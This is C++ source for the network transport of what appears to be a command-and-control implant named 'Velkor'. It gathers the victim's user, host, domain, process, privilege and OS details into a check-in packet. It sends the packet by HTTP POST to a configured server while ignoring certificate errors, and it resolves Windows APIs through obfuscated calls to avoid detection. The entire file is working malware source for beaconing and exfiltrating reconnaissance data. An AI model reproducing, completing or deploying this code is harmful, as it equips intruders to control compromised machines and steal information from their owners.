#include <Velkor.h>

D_SEC( B ) BOOL WebTransferInit(
    VOID
) {
    VELKOR_INSTANCE

    PPACKAGE Package = NULL;
    BOOL     Success = FALSE;
    PVOID    Data    = NULL;
    UINT64   Length  = 0;

    // Package = PackageCreate( VelkorCheckin );

    // Add data
    /*
        [ SIZE         ] 4 bytes
        [ Magic Value  ] 4 bytes
        [ Agent ID     ] 4 bytes
        [ COMMAND ID   ] 4 bytes
        [ Demon ID     ] 4 bytes
        [ User Name    ] size + bytes
        [ Host Name    ] size + bytes
        [ Domain       ] size + bytes
        [ IP Address   ] 16 bytes?
        [ Process Name ] size + bytes
        [ Process ID   ] 4 bytes
        [ Parent  PID  ] 4 bytes
        [ Process Arch ] 4 bytes
        [ Elevated     ] 4 bytes
        [ OS Info      ] ( 5 * 4 ) bytes
        [ OS Arch      ] 4 bytes
    */

    // Add AES Keys/IV
    // PkgAddPad( Package, Blackout.Config.AES.Key, 32 );
    // PkgAddPad( Package, Blackout.Config.AES.IV,  16 );

    PkgAddInt32(   Package, Velkor->Session.AgentId );
    PkgAddString(  Package, A_PTR( Velkor->System.ComputerName.Start ) );
    PkgAddString(  Package, A_PTR( Velkor->System.UserName.Start ) );
    PkgAddString(  Package, A_PTR( Velkor->System.DomainName.Start ) );
    //PkgAddString(  Package, A_PTR( Velkor->System.IpAddress.Start ) );
    PkgAddWString( Package, Velkor->Session.ProcessName );
    PkgAddInt32(   Package, Velkor->Session.ProcessId );
    PkgAddInt32(   Package, Velkor->Session.ParentProcessId );
    PkgAddInt32(   Package, Velkor->Session.ProcessArch );
    PkgAddInt32(   Package, Velkor->Session.Elevated );

    PkgAddInt32(   Package, Velkor->System.OsMajorV );
    PkgAddInt32(   Package, Velkor->System.OsMinorV );
    PkgAddInt32(   Package, Velkor->System.ProductType );
    PkgAddInt32(   Package, 0 );
    PkgAddInt32(   Package, Velkor->System.OsBuildNumber );

    PkgAddInt32(   Package, Velkor->System.OsArch);
    PkgAddInt32(   Package, SleepConf.SleepTime );
    PkgAddInt32(   Package, SleepConf.Jitter );
    PkgAddInt32(   Package, 0 );
    PkgAddInt32(   Package, 0 );

    if ( PkgTransmit( Package, &Data, &Length ) ) {
        VkShow( "{i} Checkin Request Transmited" );
        VkShow( "{i} Agent => %X : %X\n", U_64( C_DEF( Data ) ), U_32( Velkor->Session.AgentId ) );

        if ( Data && Velkor->Session.AgentId == U_64( C_DEF( Data ) ) ) {
            Success = TRUE;
        }
    } else {
        Success = FALSE;
    }

    Velkor->Session.Connected = Success;

    return Velkor->Session.Connected;
}

D_SEC( B ) BOOL WebTransferSend(
    _In_      PVOID   Data,
    _In_      UINT64  Size,
    _Out_opt_ PVOID  *RecvData,
    _Out_opt_ UINT64 *RecvSize
) {
    VELKOR_INSTANCE

    HANDLE hSession = NULL;
    HANDLE hConnect = NULL;
    HANDLE hRequest = NULL;
    UINT32 HttpAccessType = 0;
    PWSTR  HttpProxy = WebConf.ProxyServers;
    UINT32 HttpFlags = 0;
    UINT32 OptFlags  = 0;
    BOOL   Success   = 0;
    PVOID  RespBuffer = NULL;
    UINT64 RespSize   = 0;
    DWORD  BytesRead  = 0;
    UINT32 ContentLength = 0;
    UINT32 ContentLenLen = 0;
    PWSTR  HttpEndpoint[6] = { 0 };
    
    HttpFlags = INTERNET_FLAG_RELOAD;

    hSession = VkCall<HINTERNET>( 
        XprWininet, XPR( "InternetOpenW" ),   
        WebConf.UserAgent, HttpAccessType,
        HttpProxy, 0, 0
    );
    if ( !hSession ) {
        VkShow( "{WEB} Failed in open internet handle: %d\n", NtLastError() );
    }

    hConnect = VkCall<HINTERNET>( 
        XprWininet, XPR( "InternetConnectW" ),
        hSession, WebConf.Host, WebConf.Port,
        WebConf.ProxyUserName, WebConf.ProxyPassword,
        INTERNET_SERVICE_HTTP, 9
    );

    if ( !hConnect ) {
        VkShow( "{WEB} Failed in connect internet handle: %d\n", NtLastError() );
    }

    HttpEndpoint[0] = L"/";

    if ( WebConf.Secure ) {
        HttpFlags |= INTERNET_FLAG_SECURE;
        OptFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA   |
              SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
              SECURITY_FLAG_IGNORE_CERT_CN_INVALID   |
              SECURITY_FLAG_IGNORE_WRONG_USAGE       |
              SECURITY_FLAG_IGNORE_WEAK_SIGNATURE;
    }        

    hRequest = VkCall<HINTERNET>( 
        XPR( "wininet.dll" ), XPR( "HttpOpenRequestW" ), 
        hConnect, L"POST", HttpEndpoint[0], NULL, 
        NULL, NULL, HttpFlags, 0 
    );

    VkCall<BOOL>( XPR( "wininet.dll" ), XPR( "InternetSetOptionW" ), hRequest, INTERNET_OPTION_SECURITY_FLAGS, &OptFlags, sizeof( OptFlags ) );

    Success = VkCall<BOOL>( 
        XPR( "wininet.dll" ), XPR( "HttpSendRequestW" ),
        hRequest, WebConf.AddHeaders,
        VkStr::LengthW( WebConf.AddHeaders ),
        Data, Size
    );

    if ( Success ) {
        
        VkCall<BOOL>( 
            XPR( "wininet.dll" ), XPR( "HttpQueryInfoW" ),
            hRequest, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER,
            &ContentLength, &ContentLenLen, NULL
        );

        RespSize   = ContentLength;
        RespBuffer = VkMem::Heap::Alloc( ContentLength );
        
        VkCall<BOOL>( XPR( "wininet.dll" ), XPR( "InternetReadFile" ), hRequest, RespBuffer, RespSize, &BytesRead );

        if ( RespBuffer ) *RecvData = RespBuffer;
        if ( RecvSize   ) *RecvSize = RespSize;

        Success = TRUE;            
    } else {
        if ( NtLastError() == 12029 ) {
            Velkor->Session.Connected = FALSE;
        } else {
            VkShow( "{WEB} Failed in send request: %d\n", NtLastError() );
        }

        Success = FALSE;
    }

_U37_LEAVE:
    if ( hSession ) VkCall<BOOL>( XPR( "wininet.dll" ), XPR( "InternetCloseHandle" ), hSession );
    if ( hConnect ) VkCall<BOOL>( XPR( "wininet.dll" ), XPR( "InternetCloseHandle" ), hConnect );
    if ( hRequest ) VkCall<BOOL>( XPR( "wininet.dll" ), XPR( "InternetCloseHandle" ), hRequest );

    return Success;
}
